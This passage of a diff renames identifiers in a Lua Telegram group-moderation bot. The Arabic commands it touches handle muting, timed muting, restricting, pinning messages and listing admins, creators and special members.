+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..flash_renk(result.id_, msg.chat_id_), 1, 'md')
 else
-if FLASHdx1:sismember(FLASH..FLASH, result.id_) then
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم كتمه سابقا𓍢\n")
+if flashdx1:sismember(flash..flash, result.id_) then
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم كتمه سابقا𓍢\n")
 else
-FLASHdx1:sadd(FLASH..FLASH, result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم كتمه بنجاح𓍢\n")
+flashdx1:sadd(flash..flash, result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم كتمه بنجاح𓍢\n")
 end end end end
-resolve_username(FLASH_res[2],mute_by_username)
+resolve_username(flash_res[2],mute_by_username)
 end
---     By Developer FLASH     -- 
-if text:match("^كتم (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^كتم (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 local res = {string.match(text, "^(كتم) (%d+)$")}
-if not is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASHdx1:get("FLASH:lock:banmu"..bot_id..msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الكتم او التقييد \n❅∫ لانه معطل من قبل المنشئ ', 1, 'md')
-return "FLASH"
+if not is_monsh(msg.sender_user_id_, msg.chat_id_) and flashdx1:get("flash:lock:banmu"..bot_id..msg.chat_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع الكتم او التقييد \n❅∫ لانه معطل من قبل المنشئ ', 1, 'md')
+return "flash"
 end
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. res[2])
-local FLASH_res = user_info_ if user_info_ then
+local user_info_ = flashdx1:get(flash..'user:Name' .. res[2])
+local flash_res = user_info_ if user_info_ then
 if is_momod(res[2], msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..FLASH_renk(res[2], msg.chat_id_), 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..flash_renk(res[2], msg.chat_id_), 1, 'md')
 else
-if FLASHdx1:sismember(FLASH..'bot:muted:'..msg.chat_id_, res[2]) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم  ( كتمه ) سابقا ،*', 1, 'md')
+if flashdx1:sismember(flash..'bot:muted:'..msg.chat_id_, res[2]) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم  ( كتمه ) سابقا ،*', 1, 'md')
 end
-FLASHdx1:sadd(FLASH..'bot:muted:'..msg.chat_id_, res[2])
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم  ( كتمه ) ،*', 1, 'md')
+flashdx1:sadd(flash..'bot:muted:'..msg.chat_id_, res[2])
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم  ( كتمه ) ،*', 1, 'md')
 end end end
---     By Developer FLASH     -- 
-if text:match("^الغاء كتم$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^الغاء كتم$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 function unmute_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH = 'bot:muted:'..msg.chat_id_
-local FLASH_res = user_info_ if user_info_ then
-if not FLASHdx1:sismember(FLASH..FLASH, result.sender_user_id_) then
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ لم يتم كتمه سابقا𓍢\n")
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash = 'bot:muted:'..msg.chat_id_
+local flash_res = user_info_ if user_info_ then
+if not flashdx1:sismember(flash..flash, result.sender_user_id_) then
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ لم يتم كتمه سابقا𓍢\n")
 else
-FLASHdx1:srem(FLASH..FLASH, result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم الغاء كتمه𓍢\n")
+flashdx1:srem(flash..flash, result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم الغاء كتمه𓍢\n")
 end end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
 end
---     By Developer FLASH     -- 
-if text:match("^الغاء كتم @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^الغاء كتم @(.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 local res = {string.match(text, "^(الغاء كتم) @(.*)$")}
 function unmute_by_username(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.id_)
-local FLASH_res = user_info_ 
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.id_)
+local flash_res = user_info_ 
 if result.id_ then
-if not FLASHdx1:sismember(FLASH..'bot:muted:'..msg.chat_id_, result.id_) then
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ لم يتم كتمه سابقا𓍢\n")
+if not flashdx1:sismember(flash..'bot:muted:'..msg.chat_id_, result.id_) then
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ لم يتم كتمه سابقا𓍢\n")
 else
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم الغاء كتمه بنجاح𓍢\n")
-FLASHdx1:srem(FLASH..'bot:muted:'..msg.chat_id_, result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم الغاء كتمه بنجاح𓍢\n")
+flashdx1:srem(flash..'bot:muted:'..msg.chat_id_, result.id_)
 end end end
 resolve_username(res[2],unmute_by_username)
 end
---     By Developer FLASH     -- 
-if text:match("^الغاء كتم (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^الغاء كتم (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 local res = {string.match(text, "^(الغاء كتم) (%d+)$")}
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. res[2])
-local FLASH_res = user_info_ if user_info_ then
-if not FLASHdx1:sismember(FLASH..'bot:muted:'..msg.chat_id_, res[2]) then
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ لم يتم كتمه سابقا𓍢\n")
+local user_info_ = flashdx1:get(flash..'user:Name' .. res[2])
+local flash_res = user_info_ if user_info_ then
+if not flashdx1:sismember(flash..'bot:muted:'..msg.chat_id_, res[2]) then
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ لم يتم كتمه سابقا𓍢\n")
 else
-FLASHdx1:srem(FLASH..'bot:muted:'..msg.chat_id_, res[2])
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم الغاء كتمه بنجاح𓍢\n")
+flashdx1:srem(flash..'bot:muted:'..msg.chat_id_, res[2])
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم الغاء كتمه بنجاح𓍢\n")
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.reply_to_message_id_ ~= 0  then
 if text:match("^رفع مطي$") then
 function donky_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_
 if user_info_ then
 if is_leaderid(result.sender_user_id_) == true then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ *هوش لك متكدر ترفع المطور الاساسي والمبرمج ،*", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ *هوش لك متكدر ترفع المطور الاساسي والمبرمج ،*", 1, 'md')
 return false 
 end
 local hash = 'bot:donky:'..msg.chat_id_
-if FLASHdx1:sismember(FLASH..hash, result.sender_user_id_) then
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ هو مطي اصلا حبي 🤫😂\n")
+if flashdx1:sismember(flash..hash, result.sender_user_id_) then
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ هو مطي اصلا حبي 🤫😂\n")
 else
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم رفعه مطي 🐴\n")
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم رفعه مطي 🐴\n")
 end
-FLASHdx1:sadd(FLASH..hash, result.sender_user_id_)
+flashdx1:sadd(flash..hash, result.sender_user_id_)
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.reply_to_message_id_ ~= 0  then
 if text:match("^تنزيل مطي$") then
 function donky_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_
 if user_info_ then
 local hash = 'bot:donky:'..msg.chat_id_
-if not FLASHdx1:sismember(FLASH..hash, result.sender_user_id_) then
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ لم يتم رفعه مطي\n")
+if not flashdx1:sismember(flash..hash, result.sender_user_id_) then
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ لم يتم رفعه مطي\n")
 else
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ يبقه مطي بس حنزله لخاطرك 🤫😂\n")
-FLASHdx1:srem(FLASH..hash, result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ يبقه مطي بس حنزله لخاطرك 🤫😂\n")
+flashdx1:srem(flash..hash, result.sender_user_id_)
 end end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then  
-if text:match("^تقييد$") or text:match("^تقيد$") and FLASH11(msg) then  
+if text:match("^تقييد$") or text:match("^تقيد$") and flash11(msg) then  
 function mute_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_
 if user_info_ then
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  تستطيع تقييدي ، ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  تستطيع تقييدي ، ', 1, 'md')
 return false 
 end 
 if is_momod(result.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع تقييد ، '..FLASH_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع تقييد ، '..flash_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else 
 HTTPS.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
-FLASHdx1:sadd(FLASH..'tkeed:'..msg.chat_id_, result.sender_user_id_)
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم تقييده بنجاح𓍢\n")
+flashdx1:sadd(flash..'tkeed:'..msg.chat_id_, result.sender_user_id_)
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم تقييده بنجاح𓍢\n")
 end end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.reply_to_message_id_ ~= 0 then  
-if text:match("^الغاء تقييد$") or text:match("^الغاء تقيد$") and FLASH11(msg) then
+if text:match("^الغاء تقييد$") or text:match("^الغاء تقيد$") and flash11(msg) then
 function mute_by_reply(extra, result, success)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_
 if user_info_ then
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا انا البوت ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا انا البوت ،', 1, 'md')
 return false 
 end 
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-FLASHdx1:srem(FLASH..'tkeed:'..msg.chat_id_, result.sender_user_id_)
-Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_FLASH(msg).."\n❅∫ تم الغاء تقييده بنجاح𓍢\n")
+flashdx1:srem(flash..'tkeed:'..msg.chat_id_, result.sender_user_id_)
+Send_Options(msg,result.id_,"reply","❅∫ بواسطه ، "..renk_flash(msg).."\n❅∫ تم الغاء تقييده بنجاح𓍢\n")
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
 end end end
---     By Developer FLASH     -- 
-if text and text:match('^كتم د (%d+)$') and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match('^كتم د (%d+)$') and flash11(msg) then 
 local function mut_time(extra, result,success)
 local mutept = {string.match(text, "^كتم د (%d+)$")}
 local Minutes = string.gsub(mutept[1], 'm', '')
 local num1 = tonumber(Minutes) * 60 
 local num = tonumber(num1)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_ if user_info_ then end 
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_ if user_info_ then end 
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتمي ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتمي ', 1, 'md')
 return false end 
 if is_momod(result.sender_user_id_, msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..FLASH_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..flash_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
 Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم كتمه لمده ( '..mutept[1]..' ) دقيقه ،*', 1, 'md')
-FLASHdx1:sadd(FLASH..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم كتمه لمده ( '..mutept[1]..' ) دقيقه ،*', 1, 'md')
+flashdx1:sadd(flash..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end 
 if tonumber(msg.reply_to_message_id_) == 0 then else
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end
---     By Developer FLASH     -- 
-if text and text:match('^كتم س (%d+)$') and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match('^كتم س (%d+)$') and flash11(msg) then 
 local function mut_time(extra, result,success)
 local mutept = {string.match(text, "^كتم س (%d+)$")}
 local hour = string.gsub(mutept[1], 'h', '')
 local num1 = tonumber(hour) * 3600 
 local num = tonumber(num1)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_ if user_info_ then end 
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_ if user_info_ then end 
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتمي ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتمي ', 1, 'md')
 return false end 
 if is_momod(result.sender_user_id_, msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..FLASH_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..flash_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
 Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم كتمه لمده ( '..mutept[1]..' ) ساعه ،*', 1, 'md')
-FLASHdx1:sadd(FLASH..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم كتمه لمده ( '..mutept[1]..' ) ساعه ،*', 1, 'md')
+flashdx1:sadd(flash..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
 if tonumber(msg.reply_to_message_id_) == 0 then else
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
---     By Developer FLASH     -- 
-if text and text:match('^كتم ي (%d+)$') and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match('^كتم ي (%d+)$') and flash11(msg) then 
 local function mut_time(extra, result,success)
 local mutept = {string.match(text, "^كتم ي (%d+)$")}
 local day = string.gsub(mutept[1], 'd', '')
 local num1 = tonumber(day) * 86400 
 local num = tonumber(num1)
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_ if user_info_ then end 
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_ if user_info_ then end 
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتمي ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتمي ', 1, 'md')
 return false end 
 if is_momod(result.sender_user_id_, msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..FLASH_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لا تستطيع كتم ، '..flash_renk(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
 Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..FLASH_res..'] )\n❅∫ *بواسطه ( '..renk_FLASH(msg)..' )*\n❅∫ *تم كتمه لمده ( '..mutept[1]..' ) يوم ،*', 1, 'md')
-FLASHdx1:sadd(FLASH..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *العضو* ( ['..flash_res..'] )\n❅∫ *بواسطه ( '..renk_flash(msg)..' )*\n❅∫ *تم كتمه لمده ( '..mutept[1]..' ) يوم ،*', 1, 'md')
+flashdx1:sadd(flash..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
 if tonumber(msg.reply_to_message_id_) == 0 then else
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
---     By Developer FLASH     -- 
-if text == 'مسح المقيدين' and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then     
+--     By Developer flash     -- 
+if text == 'مسح المقيدين' and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then     
 local hash =  'tkeed:'..msg.chat_id_
-local list = FLASHdx1:smembers(FLASH..hash)
+local list = flashdx1:smembers(flash..hash)
 for k,v in pairs(list) do   
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
-FLASHdx1:srem(FLASH..'tkeed:'..msg.chat_id_, v)
+flashdx1:srem(flash..'tkeed:'..msg.chat_id_, v)
 end
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ تم مسح المقيدين ، ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ تم مسح المقيدين ، ', 1, 'md')
  end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
-if text:match("^تثبيت$") and FLASH11(msg) then  
+if text:match("^تثبيت$") and flash11(msg) then  
 local id = msg.id_
 local msgs = {[0] = id}
 pin(msg.chat_id_,msg.reply_to_message_id_,1)
-FLASHdx1:set(FLASH..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ تم تثبيت الرساله ، ', 1, 'md')
+flashdx1:set(flash..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ تم تثبيت الرساله ، ', 1, 'md')
 end end
---     By Developer FLASH     -- 
-if text == ("المقيدين") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH.."tkeed:"..msg.chat_id_)
+--     By Developer flash     -- 
+if text == ("المقيدين") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash.."tkeed:"..msg.chat_id_)
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مقيدين ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مقيدين ،", "md")
 end
 tkeed = "❅∫ قائمه المقيدين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6044,13 +6044,13 @@ username = v
 end
 tkeed = tkeed.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, tkeed, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, tkeed, "md")
 end end,nil) end end
---     By Developer FLASH     --  
-if text == ("الادمنيه") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH.."bot:momod:"..msg.chat_id_)
+--     By Developer flash     --  
+if text == ("الادمنيه") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash.."bot:momod:"..msg.chat_id_)
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد ادمنيه ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد ادمنيه ،", "md")
 end
 Admin = "❅∫ قائمه الادمنيه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6062,13 +6062,13 @@ username = v
 end
 Admin = Admin.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, Admin, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, Admin, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
-if text == ("المنشئين") and is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH.."bot:monsh2:"..msg.chat_id_)
+--     By Developer flash     -- 
+if text == ("المنشئين") and is_monsh(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash.."bot:monsh2:"..msg.chat_id_)
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد منشئين ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد منشئين ،", "md")
 end
 monsh = "❅∫ قائمه المنشئين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6080,13 +6080,13 @@ username = v
 end
 monsh = monsh.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, monsh, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, monsh, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
-if text == ("الادمنيه العامين") and is_admin(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH.."bot:moall:")
+--     By Developer flash     -- 
+if text == ("الادمنيه العامين") and is_admin(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash.."bot:moall:")
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد ادمنيه عامين ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد ادمنيه عامين ،", "md")
 end
 moall = "❅∫ قائمه الادمنيه العامين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6098,13 +6098,13 @@ username = v
 end
 moall = moall.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, moall, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, moall, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
-if text == ("الاعضاء المميزين") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH.."bot:vipmem:"..msg.chat_id_)
+--     By Developer flash     -- 
+if text == ("الاعضاء المميزين") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash.."bot:vipmem:"..msg.chat_id_)
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد اعضاء مميزين ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد اعضاء مميزين ،", "md")
 end
 vip = "❅∫ قائمه الاعضاء المميزين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6116,13 +6116,13 @@ username = v
 end
 vip = vip.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, vip, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, vip, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
-if text == ("المطايه") and FLASH11(msg) then 
-local list = FLASHdx1:smembers(FLASH.."bot:donky:"..msg.chat_id_)
+--     By Developer flash     -- 
+if text == ("المطايه") and flash11(msg) then 
+local list = flashdx1:smembers(flash.."bot:donky:"..msg.chat_id_)
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مطايه ،", "md")
